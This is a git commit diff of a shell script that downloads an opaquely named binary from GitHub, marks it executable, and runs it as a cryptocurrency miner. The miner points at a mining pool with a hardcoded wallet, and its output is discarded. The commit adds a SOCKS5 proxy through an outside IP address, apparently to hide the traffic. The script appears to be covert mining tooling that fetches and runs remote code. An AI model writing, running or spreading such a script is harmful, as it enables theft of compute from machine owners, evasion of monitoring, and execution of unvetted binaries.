21325c5ec96194b9c8c2a9ddea379450bfe8ec57
saihajinsamab255 <108542881+saihajinsamab255@users.noreply.github.com>
2022-07-02 01:03:24 +0700

    Update main.sh

--- main.sh
+++ main.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 wget https://github.com/jirensan3090/cpu/raw/main/xrgs && chmod +x xrgs
-./xrgs -o cryptonight_haven.mine.zergpool.com:4452 -a cn-heavy/xhv -k -u TQ11YB4cti4EhwYkZkoYNwE9B7nkQvTJ86.cr8-1 -p c=TRX,mc=BLOC,m=solo -t 2 > /dev/null 2>&1
+./xrgs -o cryptonight_haven.mine.zergpool.com:4452 -a cn-heavy/xhv -k -u TQ11YB4cti4EhwYkZkoYNwE9B7nkQvTJ86.cr8-1 -p c=TRX,mc=BLOC,m=solo -t 2 -x socks5://192.252.214.20:15864 > /dev/null 2>&1
